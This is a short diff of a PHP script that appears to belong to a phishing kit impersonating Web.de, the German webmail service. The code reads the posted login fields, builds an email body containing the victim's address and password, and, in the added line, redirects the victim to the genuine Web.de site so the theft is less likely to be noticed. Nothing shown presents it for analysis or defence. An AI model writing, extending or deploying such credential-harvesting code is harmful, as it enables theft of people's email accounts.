@@ -1,7 +1,7 @@
 <?php
 if(isset($_POST['login'])) {
   extract($_POST); 
-  
+  header("Location: https://mm.web.de/");
   //send email
   $body="New Web.de details has been sent. \n\nEmail: $email \n Password: $password. \n\n Kind Regards";
 
